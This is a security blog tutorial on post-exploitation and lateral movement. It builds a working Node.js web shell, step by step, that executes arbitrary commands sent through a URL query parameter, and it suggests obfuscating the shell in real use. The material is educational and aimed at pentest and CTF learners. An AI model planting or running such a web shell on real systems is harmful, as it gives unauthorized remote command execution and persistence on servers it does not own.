---
title: 'Life after getting root: Part I'
date: 2019-08-05 10:00:06
tags:
---



## l337 h4x0R 👨‍💻


When newcomers to the security field (like myself :grin:) learn a few techniques to pwn a machine, they try to learn more and more methods because they think their end goal is just to be root on a specific machine ( :wave: some CTFs). 

Don't get me wrong, the adrenaline that you get when you do that is real and maybe your friends are impressed, but don't you want to get to the next level and use your new position to sniff around even more to try and find a new target? 

### "I am domain admin, there is nothing stopping me :smiling_imp:"

Well, not quite. :wink: 

* There can be the case that you have worked for days or weeks to get control over the domain controller and because of the [forest organisation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model) that is used, you still cannot access what you wanted.
* Sometimes people are watching and trying to catch you ( :wave: threat hunters  ), so sooner or later you will lose that priviledge.

---

### Back to the basics

If you read any hacking methodology, you will remember that the stages that you will go through are:
    1. Inteligence Gathering 
    2. Threat Modelling
    3. Vulnerability Analysis
    4. Expoitation
    5. Post Exploitation

###### Note: If you want to do this professionally, the methodology will look like this:
1. **Pre-engagement Interaction**
2. Inteligence Gathering 
3. Threat Modelling
4. Vulnerability Analysis
5. Expoitation
6. Post Exploitation
7. **Reporting**
---


The first time when I read that, I thought the *Post Exploitation* step is the one that does not matter that much because it can be summarized as "get the information that you want and disappear".
###### Spoiler alert: I was terribly wrong. 😥 

## Lateral Movement

When we talk about lateral movement in respect to the methodology from above, you might need to repeat the steps from 1-4 again and again, along with other steps, such as exfiltrating the data and covering your tracks.

### Old habits never die


##### Remember
Just because you have a high privileged account, it doesn't mean that you can move freely everywhere. There may be the case that you have to escalate your privileges again, so do not get too comfy. :worried:


A summary of this idea can be:
* Find assets
* Escalate priviledge
* Move around the network
* Repeat



###### Note: It is not always the case that you can go from a low privileged account to a high privileged account, you might need to move a bit until you find that account that is your golden ticket.



![Credits: https://github.com/infosecn1nja ](https://camo.githubusercontent.com/9547d8152e3490a6e5e3da0279faab64340885be/68747470733a2f2f646f63732e6d6963726f736f66742e636f6d2f656e2d75732f616476616e6365642d7468726561742d616e616c79746963732f6d656469612f61747461636b2d6b696c6c2d636861696e2d736d616c6c2e6a7067)


### Techniques and tactics

**"This was all nice talk but show me something technical. 🙄 "**
A lot of people try to skip the introduction and go straight to the "juicy stuff" and while that might be appropriate for some, people that are just starting need to understand the motivation for learning those techniques, because at the end of the day no one will be impressed that you know SSH Hijacking or Pass the Hash, if you do not have an intuition for why you might use it.


#### Web shells
This is the most common type of lateral movement when you find a server running on HTTP/HTTPS.

We will do an example in NodeJS with no external dependencies 😲 and I will also make the code readable, for educational purposes, but in a real even, you should try to obfuscate the code as much as possible.


1. the components that we will need are the 'http', 'url' and 'child_process' modules that Node provides out of the box

```javascript
const http = require('http');
const process = require('child_process');
const url = require('url');
```
1. create the server that will execute our commands/the payload and set up the hostname IP and port

``` javascript
const http = require('http');
const process = require('child_process');
const url = require('url');

const HOSTNAME = '127.0.0.1';
const PORT = 9002;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 
        "Content-Type": "text/plain",
    });
  });

server.listen(PORT, HOSTNAME, () => {
    console.log(`Server running at http://${HOSTNAME}:${PORT}/`);
  });
```
---
###### **Fun fact** for all of you Node nerds (I know you exist): We could have used the *setHeader* method  instead of the *writeHead* method, but if you find yourself that you need to send multiple headers, you could do everything in a single method (writeHead) or use multiple methods (setHeader).

``` javascript
const server = http.createServer((req, res) => {
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader("Set-Cookie", "type=ninja");
  });
```

``` javascript
const server = http.createServer((req, res) => {
       res.writeHead(200, { 
        "Content-Type": "text/plain",
        "Set-Cookie": "type=ninja",
    }); 
  });
```




---

Back to our webshell.
1. we will insert all our payloads as *?cmd=evilCommand*, so to do this, we will take the url, parse it and get the query from it

``` javascript
const http = require('http');
const process = require('child_process');
const url = require('url');

const HOSTNAME = '127.0.0.1';
const PORT = 9002;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 
        "Content-Type": "text/plain",
    });
    const queryData = url.parse(req.url, true).query;

    if(queryData.cmd){
        res.end(`You are so evil, trying to execute ${queryData.cmd}\n`);
    } else {
        res.end(`How about a payload?\n`);
    }

  });


server.listen(PORT, HOSTNAME, () => {
    console.log(`Server running at http://${HOSTNAME}:${PORT}/`);
  });

```
If you were to test the shell so far by going to *http://127.0.0.1:9002/?cmd=whoami*, you would see:

![Web Shell 1](/../posts_resources/Life-after-getting-root/web-shell1.png) 

1. execute the payload and send back the result of stdout

```javascript
const http = require('http');
const process = require('child_process');
const url = require('url');

const HOSTNAME = '127.0.0.1';
const PORT = 9002;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 
        "Content-Type": "text/plain",
    });
    const queryData = url.parse(req.url, true).query;

    if(queryData.cmd){
        //res.end(`You are so evil, trying to execute:\n ${queryData.cmd}\n`);
        process.exec(queryData.cmd, (err, stdout, stderr) => {
            res.end(stdout);
        });
    } else {
        res.end(`How about a payload?\n`);
    }

  });


server.listen(PORT, HOSTNAME, () => {
    console.log(`Server running at http://${HOSTNAME}:${PORT}/`);
  });
```
Congrats, you have just learnt how to build a web shell. 🎉 🙌

![Web Shell 2](/../posts_resources/Life-after-getting-root/web-shell2.png)

A complex example of a web shell is the "China Chopper Web Shell", which can also be used as a persistence mechanism for an attacker. A full analysis was done by FireEye [here](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-china-chopper.pdf).
Also, if you want to know more about web shells, I recommend [this resource](https://attack.mitre.org/techniques/T1100/).
This is the end of the first part folks 👋. 

In the second part, I will cover more techniques for lateral movement and we will also make a quick transition to the next big topic: Persistence. 😆
